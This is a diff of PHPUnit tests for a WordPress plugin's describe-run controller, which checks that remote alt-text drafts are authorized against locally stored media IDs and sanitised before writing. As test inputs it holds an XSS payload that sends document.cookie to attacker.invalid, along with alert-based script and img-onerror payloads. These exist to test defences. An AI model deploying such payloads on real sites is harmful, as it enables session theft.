@@ -28,6 +28,11 @@ class DescribeRunControllerTest extends TestCase
     protected function setUp(): void
     {
         parent::setUp();
+        // Option-write harness state is not cleared by the base TestCase; reset
+        // here so a forced-failure test cannot leak into later submits.
+        $GLOBALS['__ac_update_option_fail'] = [];
+        $GLOBALS['__ac_update_option_calls'] = [];
+        $GLOBALS['__ac_option_autoload'] = [];
         $this->setOption('acx_recognition_url', 'http://localhost:8000');
         $this->setOption('acx_recognition_api_key', 'test-key');
         $this->controller = new DescribeController();
@@ -100,6 +105,12 @@ class DescribeRunControllerTest extends TestCase
         $this->assertStringContainsString('name="image_202"; filename="202.png"', $body);
         $this->assertStringContainsString('Content-Type: image/png', $body);
         $this->assertStringContainsString($bytes202, $body);
+
+        // BR-129 / BR-134: successful submit records the media_id set for later apply.
+        $stored = get_option('acx_describe_run_media_ids_11111111-1111-1111-1111-111111111111');
+        $this->assertIsArray($stored);
+        $this->assertSame([101, 202], $stored['media_ids'] ?? null);
+        $this->assertArrayHasKey('created_at', $stored);
     }
 
     public function testSubmitRejectsMoreThan200MediaIds(): void
@@ -293,6 +304,29 @@ class DescribeRunControllerTest extends TestCase
         $GLOBALS['__ac_posts'][$id] = (object) ['ID' => $id, 'post_type' => $type];
     }
 
+    /**
+     * BR-129 / BR-134: plant the WP-side submitted media_id set that apply intersects against.
+     *
+     * @param int[] $mediaIds
+     */
+    private function plantSubmittedMediaIds(string $runId, array $mediaIds, ?int $createdAt = null): void
+    {
+        update_option(
+            'acx_describe_run_media_ids_' . $runId,
+            [
+                'media_ids' => array_values($mediaIds),
+                'created_at' => $createdAt ?? time(),
+            ],
+            false
+        );
+        $index = get_option('acx_describe_run_media_ids_index', []);
+        if (!is_array($index)) {
+            $index = [];
+        }
+        $index[$runId] = $createdAt ?? time();
+        update_option('acx_describe_run_media_ids_index', $index, false);
+    }
+
     private function queueRunStatusResponse(string $runId, string $status = 'completed'): void
     {
         $this->queueHttpResponse([
@@ -317,6 +351,7 @@ class DescribeRunControllerTest extends TestCase
         // media 70: has draft, WILL have existing alt planted by the test.
         // media 71: has draft, no existing alt (safe auto-apply).
         // media 72: failed item, no draft.
+        $this->plantSubmittedMediaIds($runId, [70, 71, 72]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -422,6 +457,7 @@ class DescribeRunControllerTest extends TestCase
         $runId = '11111111-1111-1111-1111-111111111111';
         $this->plantPostType(73, 'post');
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [73]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -455,6 +491,7 @@ class DescribeRunControllerTest extends TestCase
         $this->setPostMeta(70, '_wp_attachment_image_alt', 'human 70');
         $this->setPostMeta(71, '_wp_attachment_image_alt', 'human 71');
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [70, 71]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -702,6 +739,7 @@ class DescribeRunControllerTest extends TestCase
         $this->setPostMeta(71, '_wp_attachment_image_alt', 'a dog in a park');
         // No provenance, no pending marker — coincidental match only.
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [71]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -742,6 +780,7 @@ class DescribeRunControllerTest extends TestCase
             'draft_hash' => hash('sha256', $draft),
         ]);
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [71]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -786,6 +825,7 @@ class DescribeRunControllerTest extends TestCase
             'draft_hash' => hash('sha256', 'older draft that is no longer current'),
         ]);
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [71]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -826,6 +866,7 @@ class DescribeRunControllerTest extends TestCase
         $this->setPostMeta(71, '_wp_attachment_image_alt', $draft);
         $this->setPostMeta(71, '_acx_description_human_edit', $humanEdit);
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [71]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -876,6 +917,7 @@ class DescribeRunControllerTest extends TestCase
             'draft_hash' => hash('sha256', $draft),
         ]);
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [71]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -911,6 +953,7 @@ class DescribeRunControllerTest extends TestCase
         $runId = '11111111-1111-1111-1111-111111111111';
         $this->plantPostType(71);
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [71]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -944,6 +987,7 @@ class DescribeRunControllerTest extends TestCase
         $runId = '11111111-1111-1111-1111-111111111111';
         $this->plantPostType(71);
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [71]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -1031,6 +1075,7 @@ class DescribeRunControllerTest extends TestCase
         ]);
         // No provenance — only the alt!==draft conjunct keeps this guarded.
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [71]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -1075,6 +1120,7 @@ class DescribeRunControllerTest extends TestCase
             'draft_hash' => hash('sha256', $draft),
         ]);
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [71]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -1109,6 +1155,7 @@ class DescribeRunControllerTest extends TestCase
         $runId = '11111111-1111-1111-1111-111111111111';
         $this->plantPostType(71);
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [71]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -1152,6 +1199,7 @@ class DescribeRunControllerTest extends TestCase
         $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
         $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance_pending'] = true;
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [71]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -1189,6 +1237,7 @@ class DescribeRunControllerTest extends TestCase
         $this->plantPostType(71);
         $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [71]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             // Body deliberately omits run_id.
@@ -1272,6 +1321,7 @@ class DescribeRunControllerTest extends TestCase
             'draft_hash' => hash('sha256', $draft),
         ]);
         $this->queueRunStatusResponse($runId, 'completed');
+        $this->plantSubmittedMediaIds($runId, [70]);
         $this->queueHttpResponse([
             'response' => ['code' => 200, 'message' => 'OK'],
             'body' => json_encode([
@@ -1355,5 +1405,831 @@ class DescribeRunControllerTest extends TestCase
         $data = $response->get_data();
         $this->assertArrayNotHasKey('items', $data);
         $this->assertSame($runId, $data['run_id']);
+    }
+
+    /**
+     * BR-129: without a locally recorded media_id set, apply fails closed (502).
+     * Goes RED if apply falls back to trusting the remote items list.
+     */
+    public function testApplyFailsClosedWhenSubmittedMediaIdsMissing(): void
+    {
+        $runId = '11111111-1111-1111-1111-111111111111';
+        $this->plantPostType(71);
+        $this->queueRunStatusResponse($runId, 'completed');
+        // Intentionally do NOT plant submitted media ids.
+        $this->queueHttpResponse([
+            'response' => ['code' => 200, 'message' => 'OK'],
+            'body' => json_encode([
+                'tenant_id' => self::currentTenantId(),
+                'run_id' => $runId,
+                'items' => [
+                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'hostile draft', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
+                ],
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
+        $request->set_param('run_id', $runId);
+
+        $response = $this->controller->apply_describe_run_drafts($request);
+        $this->assertInstanceOf(\WP_Error::class, $response);
+        $this->assertSame('describe_run_media_ids_unknown', $response->get_error_code());
+        $this->assertSame(502, $response->get_error_data()['status'] ?? null);
+        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
+    }
+
+    /**
+     * BR-129: non-numeric media_id strings must be rejected, not (int)-coerced.
+     * Submitted set deliberately includes 71 so that coercing "71junk"→71 would
+     * pass membership and write — the strict parser is the only brake. Goes RED
+     * if parse_strict_positive_int falls back to (int) casting.
+     */
+    public function testApplyRejectsNonNumericMediaIdWith502(): void
+    {
+        $runId = '11111111-1111-1111-1111-111111111111';
+        $this->plantPostType(71);
+        // 71 is in the submitted set: coercion would authorize the write.
+        $this->plantSubmittedMediaIds($runId, [71]);
+        $this->queueRunStatusResponse($runId, 'completed');
+        $this->queueHttpResponse([
+            'response' => ['code' => 200, 'message' => 'OK'],
+            'body' => json_encode([
+                'tenant_id' => self::currentTenantId(),
+                'run_id' => $runId,
+                'items' => [
+                    // Coercible junk: (int)"71junk" === 71 under the old path.
+                    ['media_id' => '71junk', 'status' => 'completed', 'alt_text_draft' => 'injected alt', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
+                ],
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
+        $request->set_param('run_id', $runId);
+
+        $response = $this->controller->apply_describe_run_drafts($request);
+        $this->assertInstanceOf(\WP_Error::class, $response);
+        $this->assertSame('describe_run_items_contract_violation', $response->get_error_code());
+        $this->assertSame(502, $response->get_error_data()['status'] ?? null);
+        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
+    }
+
+    /**
+     * BR-129: a strict positive int media_id that was never submitted is also 502.
+     */
+    public function testApplyRejectsUnsubmittedStrictMediaIdWith502(): void
+    {
+        $runId = '11111111-1111-1111-1111-111111111111';
+        $this->plantPostType(70);
+        $this->plantPostType(71);
+        $this->plantSubmittedMediaIds($runId, [70]);
+        $this->queueRunStatusResponse($runId, 'completed');
+        $this->queueHttpResponse([
+            'response' => ['code' => 200, 'message' => 'OK'],
+            'body' => json_encode([
+                'tenant_id' => self::currentTenantId(),
+                'run_id' => $runId,
+                'items' => [
+                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'foreign target', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
+                ],
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
+        $request->set_param('run_id', $runId);
+
+        $response = $this->controller->apply_describe_run_drafts($request);
+        $this->assertInstanceOf(\WP_Error::class, $response);
+        $this->assertSame('describe_run_items_contract_violation', $response->get_error_code());
+        $this->assertSame(502, $response->get_error_data()['status'] ?? null);
+        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
+    }
+
+    /**
+     * BR-129: items response larger than the per-run media-id cap is 502.
+     */
+    public function testApplyRejectsItemsOverflowWith502(): void
+    {
+        $runId = '11111111-1111-1111-1111-111111111111';
+        add_filter('acx_describe_run_max_items', static fn (): int => 2);
+        $this->plantSubmittedMediaIds($runId, [70, 71]);
+        $this->plantPostType(70);
+        $this->plantPostType(71);
+        $this->queueRunStatusResponse($runId, 'completed');
+        $this->queueHttpResponse([
+            'response' => ['code' => 200, 'message' => 'OK'],
+            'body' => json_encode([
+                'tenant_id' => self::currentTenantId(),
+                'run_id' => $runId,
+                'items' => [
+                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => 'a', 'caption' => null, 'provenance' => null],
+                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'b', 'caption' => null, 'provenance' => null],
+                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => 'c', 'caption' => null, 'provenance' => null],
+                ],
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
+        $request->set_param('run_id', $runId);
+
+        $response = $this->controller->apply_describe_run_drafts($request);
+        $this->assertInstanceOf(\WP_Error::class, $response);
+        $this->assertSame('describe_run_items_overflow', $response->get_error_code());
+        $this->assertSame(502, $response->get_error_data()['status'] ?? null);
+        $this->assertSame('', get_post_meta(70, '_wp_attachment_image_alt', true));
+    }
+
+    /**
+     * BR-130 sibling: bulk-apply strips hostile markup from alt_text_draft before
+     * writing _wp_attachment_image_alt. Distinct from DescribeMediaService's
+     * normalize_alt_text_draft / alt_text_long paths — this is the apply loop
+     * in DescribeController. Goes RED if the apply path writes the raw draft.
+     */
+    public function testApplyStripsHostileMarkupFromAltTextDraft(): void
+    {
+        $runId = '11111111-1111-1111-1111-111111111111';
+        $this->plantPostType(71);
+        $this->plantSubmittedMediaIds($runId, [71]);
+        $this->queueRunStatusResponse($runId, 'completed');
+        $hostile = "<script>fetch('https://attacker.invalid/?c='+document.cookie)</script>A calm lake.";
+        $this->queueHttpResponse([
+            'response' => ['code' => 200, 'message' => 'OK'],
+            'body' => json_encode([
+                'tenant_id' => self::currentTenantId(),
+                'run_id' => $runId,
+                'items' => [
+                    [
+                        'media_id' => 71,
+                        'status' => 'completed',
+                        'alt_text_draft' => $hostile,
+                        'caption' => null,
+                        'provenance' => ['adapter' => 'florence'],
+                    ],
+                ],
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
+        $request->set_param('run_id', $runId);
+
+        $response = $this->controller->apply_describe_run_drafts($request);
+        $this->assertNotInstanceOf(\WP_Error::class, $response);
+        $this->assertSame(200, $response->get_status());
+        $this->assertSame([71], $response->get_data()['applied']);
+
+        $stored = get_post_meta(71, '_wp_attachment_image_alt', true);
+        $this->assertStringNotContainsString('<script>', $stored);
+        $this->assertStringNotContainsString('attacker.invalid', $stored);
+        $this->assertStringNotContainsString('document.cookie', $stored);
+        $this->assertSame('A calm lake.', $stored);
+    }
+
+    /**
+     * BR-133: bare `<` in prose must not truncate bulk-apply drafts.
+     * Goes RED if apply still uses bare wp_strip_all_tags / strip_tags.
+     *
+     * @dataProvider bareLessThanDraftProvider
+     */
+    public function testApplyPreservesBareLessThanInAltTextDraft(string $draft, string $expected): void
+    {
+        $runId = '11111111-1111-1111-1111-111111111133';
+        $this->plantPostType(71);
+        $this->plantSubmittedMediaIds($runId, [71]);
+        $this->queueRunStatusResponse($runId, 'completed');
+        $this->queueHttpResponse([
+            'response' => ['code' => 200, 'message' => 'OK'],
+            'body' => json_encode([
+                'tenant_id' => self::currentTenantId(),
+                'run_id' => $runId,
+                'items' => [
+                    [
+                        'media_id' => 71,
+                        'status' => 'completed',
+                        'alt_text_draft' => $draft,
+                        'caption' => null,
+                        'provenance' => ['adapter' => 'florence'],
+                    ],
+                ],
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
+        $request->set_param('run_id', $runId);
+
+        $response = $this->controller->apply_describe_run_drafts($request);
+        $this->assertNotInstanceOf(\WP_Error::class, $response);
+        $this->assertSame([71], $response->get_data()['applied']);
+        $this->assertSame($expected, get_post_meta(71, '_wp_attachment_image_alt', true));
+        $this->assertStringNotContainsString('<script>', (string) get_post_meta(71, '_wp_attachment_image_alt', true));
+        $this->assertStringNotContainsString('<img', (string) get_post_meta(71, '_wp_attachment_image_alt', true));
+    }
+
+    /**
+     * @return array<string, array{0: string, 1: string}>
+     */
+    public static function bareLessThanDraftProvider(): array
+    {
+        return [
+            'comparison' => ['x <= y', 'x &lt;= y'],
+            'heart_prose' => [
+                'Photo of a <3 shaped cloud above the lake',
+                'Photo of a &lt;3 shaped cloud above the lake',
+            ],
+            'script_still_stripped' => [
+                '<script>alert(1)</script>Safe text',
+                'Safe text',
+            ],
+            'img_onerror_still_stripped' => [
+                '<img src=x onerror=alert(1)>A photo.',
+                'A photo.',
+            ],
+        ];
+    }
+
+    /**
+     * BR-133 seam: partial → retry → recover must hash the *sanitized* draft
+     * (same value written to alt and to the pending marker) when the draft
+     * contains both markup and a bare `<`.
+     */
+    public function testApplyPartialRecoveryWithBareLessThanAndMarkup(): void
+    {
+        $runId = '11111111-1111-1111-1111-111111111134';
+        $rawDraft = 'x <= y <script>alert(1)</script> and a <3 cloud';
+        $expected = sanitize_text_field($rawDraft);
+        // Script body removed; remaining whitespace collapsed by sanitize_text_field.
+        $this->assertSame('x &lt;= y and a &lt;3 cloud', $expected);
+
+        $this->plantPostType(71);
+        $this->plantSubmittedMediaIds($runId, [71]);
+        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
+        $this->queueRunStatusResponse($runId, 'completed');
+        $this->queueHttpResponse([
+            'response' => ['code' => 200, 'message' => 'OK'],
+            'body' => json_encode([
+                'tenant_id' => self::currentTenantId(),
+                'run_id' => $runId,
+                'items' => [
+                    [
+                        'media_id' => 71,
+                        'status' => 'completed',
+                        'alt_text_draft' => $rawDraft,
+                        'caption' => null,
+                        'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2'],
+                    ],
+                ],
+            ]),
+        ]);
+
+        $first = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
+        $first->set_param('run_id', $runId);
+        $firstResponse = $this->controller->apply_describe_run_drafts($first);
+        $this->assertNotInstanceOf(\WP_Error::class, $firstResponse);
+        $this->assertSame([71], $firstResponse->get_data()['partial']);
+        $this->assertSame($expected, get_post_meta(71, '_wp_attachment_image_alt', true));
+        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
+        $this->assertIsArray($pending);
+        $this->assertSame(hash('sha256', $expected), $pending['draft_hash']);
+
+        unset($GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance']);
+        $this->queueRunStatusResponse($runId, 'completed');
+        $this->queueHttpResponse([
+            'response' => ['code' => 200, 'message' => 'OK'],
+            'body' => json_encode([
+                'tenant_id' => self::currentTenantId(),
+                'run_id' => $runId,
+                'items' => [
+                    [
+                        'media_id' => 71,
+                        'status' => 'completed',
+                        'alt_text_draft' => $rawDraft,
+                        'caption' => null,
+                        'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2'],
+                    ],
+                ],
+            ]),
+        ]);
+
+        $second = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
+        $second->set_param('run_id', $runId);
+        $secondResponse = $this->controller->apply_describe_run_drafts($second);
+        $this->assertNotInstanceOf(\WP_Error::class, $secondResponse);
+        $this->assertSame([71], $secondResponse->get_data()['applied']);
+        $this->assertSame($expected, get_post_meta(71, '_wp_attachment_image_alt', true));
+        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
+        $prov = get_post_meta(71, '_acx_description_provenance', true);
+        $this->assertIsArray($prov);
+        $this->assertSame($runId, $prov['run_id']);
+    }
+
+    /**
+     * BR-134: membership is durable — apply still works after 24h.
+     * Goes RED if load_run_media_ids reintroduces a TTL gate.
+     */
+    public function testApplyWorksWhenMembershipOlderThan24Hours(): void
+    {
+        $runId = '11111111-1111-1111-1111-111111111135';
+        $this->plantPostType(71);
+        $this->plantSubmittedMediaIds($runId, [71], time() - 90000);
+        $this->queueRunStatusResponse($runId, 'completed');
+        $this->queueHttpResponse([
+            'response' => ['code' => 200, 'message' => 'OK'],
+            'body' => json_encode([
+                'tenant_id' => self::currentTenantId(),
+                'run_id' => $runId,
+                'items' => [
+                    [
+                        'media_id' => 71,
+                        'status' => 'completed',
+                        'alt_text_draft' => 'still applyable',
+                        'caption' => null,
+                        'provenance' => ['adapter' => 'florence'],
+                    ],
+                ],
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
+        $request->set_param('run_id', $runId);
+        $response = $this->controller->apply_describe_run_drafts($request);
+        $this->assertNotInstanceOf(\WP_Error::class, $response);
+        $this->assertSame([71], $response->get_data()['applied']);
+        $this->assertSame('still applyable', get_post_meta(71, '_wp_attachment_image_alt', true));
+    }
+
+    /**
+     * BR-134 / BR-143: failed durable membership write must not report submit
+     * success. Goes RED if store_run_media_ids discards update_option's return.
+     * BR-143: WP_Error data carries run_id and the message names the run in prose.
+     */
+    public function testSubmitFailsLoudlyWhenMembershipWriteFails(): void
+    {
+        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
+        $runId = '11111111-1111-1111-1111-111111111136';
+        $this->queueHttpResponse([
+            'response' => ['code' => 202, 'message' => 'Accepted'],
+            'body' => json_encode([
+                'run_id' => $runId,
+                'status' => 'pending',
+                'phase' => 'queued',
+                'completed' => 0,
+                'failed' => 0,
+                'skipped' => 0,
+                'total' => 1,
+                'cancel_requested' => false,
+                'gpu_state' => null,
+            ]),
+        ]);
+        $optionKey = 'acx_describe_run_media_ids_' . $runId;
+        $GLOBALS['__ac_update_option_fail'][$optionKey] = true;
+        $GLOBALS['__ac_update_option_calls'] = [];
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
+        $request->set_param('media_ids', [101]);
+        $response = $this->controller->submit_describe_run($request);
+
+        $this->assertInstanceOf(\WP_Error::class, $response);
+        $this->assertSame('describe_run_media_ids_store_failed', $response->get_error_code());
+        $this->assertSame($runId, $response->get_error_data()['run_id'] ?? null);
+        $this->assertStringContainsString('cannot be applied', $response->get_error_message());
+        // BR-143: message must name the run id in prose for message-only clients.
+        $this->assertStringContainsString($runId, $response->get_error_message());
+        $this->assertFalse(get_option($optionKey, false));
+        // BR-143: membership write is retried once before giving up.
+        $this->assertSame(2, $GLOBALS['__ac_update_option_calls'][$optionKey] ?? 0);
+    }
+
+    /**
+     * BR-134: index pruner drops age-expired membership options and leaves current.
+     */
+    public function testMembershipIndexPrunesByAge(): void
+    {
+        $oldRun = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
+        $this->plantSubmittedMediaIds($oldRun, [1], time() - 31 * 86400);
+
+        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
+        $newRun = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';
+        $this->queueHttpResponse([
+            'response' => ['code' => 202, 'message' => 'Accepted'],
+            'body' => json_encode([
+                'run_id' => $newRun,
+                'status' => 'pending',
+                'phase' => 'queued',
+                'completed' => 0,
+                'failed' => 0,
+                'skipped' => 0,
+                'total' => 1,
+                'cancel_requested' => false,
+                'gpu_state' => null,
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
+        $request->set_param('media_ids', [101]);
+        $response = $this->controller->submit_describe_run($request);
+        $this->assertNotInstanceOf(\WP_Error::class, $response);
+
+        $this->assertFalse(get_option('acx_describe_run_media_ids_' . $oldRun, false));
+        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $newRun, false));
+        $index = get_option('acx_describe_run_media_ids_index', []);
+        $this->assertArrayNotHasKey($oldRun, $index);
+        $this->assertArrayHasKey($newRun, $index);
+    }
+
+    /**
+     * BR-134 / BR-142: index pruner caps at 200 by evicting entries older than the
+     * 7-day retention floor (oldest first). Entries past the floor but under the
+     * 30d hard age prune are eligible for cap eviction.
+     *
+     * Changed from the pre-BR-142 behaviour that evicted *any* oldest entry past
+     * the cap (including same-day runs). Authorization outranks storage economy:
+     * only aged-past-floor entries may be cap-evicted.
+     */
+    public function testMembershipIndexPrunesByCap(): void
+    {
+        $now = time();
+        // All 200 entries are ~8–10 days old: older than the 7d floor, younger
+        // than the 30d age prune — so cap eviction (not age) removes the oldest.
+        for ($i = 0; $i < 200; $i++) {
+            $runId = sprintf('cccccccc-cccc-cccc-cccc-%012d', $i);
+            $this->plantSubmittedMediaIds($runId, [1], $now - (10 * 86400) + $i);
+        }
+        $oldestRun = sprintf('cccccccc-cccc-cccc-cccc-%012d', 0);
+        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $oldestRun, false));
+
+        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
+        $newRun = 'dddddddd-dddd-dddd-dddd-dddddddddddd';
+        $this->queueHttpResponse([
+            'response' => ['code' => 202, 'message' => 'Accepted'],
+            'body' => json_encode([
+                'run_id' => $newRun,
+                'status' => 'pending',
+                'phase' => 'queued',
+                'completed' => 0,
+                'failed' => 0,
+                'skipped' => 0,
+                'total' => 1,
+                'cancel_requested' => false,
+                'gpu_state' => null,
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
+        $request->set_param('media_ids', [101]);
+        $response = $this->controller->submit_describe_run($request);
+        $this->assertNotInstanceOf(\WP_Error::class, $response);
+
+        $index = get_option('acx_describe_run_media_ids_index', []);
+        $this->assertCount(200, $index);
+        $this->assertArrayNotHasKey($oldestRun, $index);
+        $this->assertFalse(get_option('acx_describe_run_media_ids_' . $oldestRun, false));
+        $this->assertArrayHasKey($newRun, $index);
+        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $newRun, false));
+    }
+
+    /**
+     * BR-142: when the index is past the 200 cap entirely with *recent* runs
+     * (younger than the 7d retention floor), cap eviction must not revoke the
+     * oldest membership — let the index exceed the cap. Goes RED if prune still
+     * delete_option()s any oldest entry regardless of age.
+     */
+    public function testMembershipIndexCapDoesNotEvictRecentRuns(): void
+    {
+        $now = time();
+        for ($i = 0; $i < 200; $i++) {
+            $runId = sprintf('eeeeeeee-eeee-eeee-eeee-%012d', $i);
+            // All within ~33 minutes — well under the 7-day floor.
+            $this->plantSubmittedMediaIds($runId, [70 + ($i % 5)], $now - 2000 + $i);
+        }
+        $oldestRun = sprintf('eeeeeeee-eeee-eeee-eeee-%012d', 0);
+        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $oldestRun, false));
+
+        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
+        $newRun = 'ffffffff-ffff-ffff-ffff-ffffffffffff';
+        $this->queueHttpResponse([
+            'response' => ['code' => 202, 'message' => 'Accepted'],
+            'body' => json_encode([
+                'run_id' => $newRun,
+                'status' => 'pending',
+                'phase' => 'queued',
+                'completed' => 0,
+                'failed' => 0,
+                'skipped' => 0,
+                'total' => 1,
+                'cancel_requested' => false,
+                'gpu_state' => null,
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
+        $request->set_param('media_ids', [101]);
+        $response = $this->controller->submit_describe_run($request);
+        $this->assertNotInstanceOf(\WP_Error::class, $response);
+
+        $index = get_option('acx_describe_run_media_ids_index', []);
+        // Cap may not be satisfied — index exceeds 200 rather than revoke live runs.
+        $this->assertGreaterThan(200, count($index));
+        $this->assertArrayHasKey($oldestRun, $index);
+        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $oldestRun, false));
+        $this->assertArrayHasKey($newRun, $index);
+
+        // Oldest recent membership still authorizes apply.
+        $this->plantPostType(70);
+        $this->queueRunStatusResponse($oldestRun, 'completed');
+        $this->queueHttpResponse([
+            'response' => ['code' => 200, 'message' => 'OK'],
+            'body' => json_encode([
+                'tenant_id' => self::currentTenantId(),
+                'run_id' => $oldestRun,
+                'items' => [
+                    [
+                        'media_id' => 70,
+                        'status' => 'completed',
+                        'alt_text_draft' => 'still live after cap overflow',
+                        'caption' => null,
+                        'provenance' => ['adapter' => 'florence'],
+                    ],
+                ],
+            ]),
+        ]);
+        $apply = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $oldestRun . '/apply');
+        $apply->set_param('run_id', $oldestRun);
+        $applyResponse = $this->controller->apply_describe_run_drafts($apply);
+        $this->assertNotInstanceOf(\WP_Error::class, $applyResponse);
+        $this->assertSame([70], $applyResponse->get_data()['applied']);
+    }
+
+    /**
+     * BR-148: index write failure must not silently orphan membership forever
+     * without visibility — retry once, keep membership, log the condition.
+     * Goes RED if remember_run_media_ids_index ignores update_option's return.
+     */
+    public function testIndexWriteFailureRetriesAndKeepsMembership(): void
+    {
+        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
+        $runId = '11111111-1111-1111-1111-111111111148';
+        $this->queueHttpResponse([
+            'response' => ['code' => 202, 'message' => 'Accepted'],
+            'body' => json_encode([
+                'run_id' => $runId,
+                'status' => 'pending',
+                'phase' => 'queued',
+                'completed' => 0,
+                'failed' => 0,
+                'skipped' => 0,
+                'total' => 1,
+                'cancel_requested' => false,
+                'gpu_state' => null,
+            ]),
+        ]);
+
+        $indexKey = 'acx_describe_run_media_ids_index';
+        $membershipKey = 'acx_describe_run_media_ids_' . $runId;
+        $GLOBALS['__ac_update_option_fail'][$indexKey] = true;
+        $GLOBALS['__ac_update_option_calls'] = [];
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
+        $request->set_param('media_ids', [101]);
+        $response = $this->controller->submit_describe_run($request);
+
+        // Membership write succeeded; submit still 202 — authorization retained.
+        $this->assertNotInstanceOf(\WP_Error::class, $response);
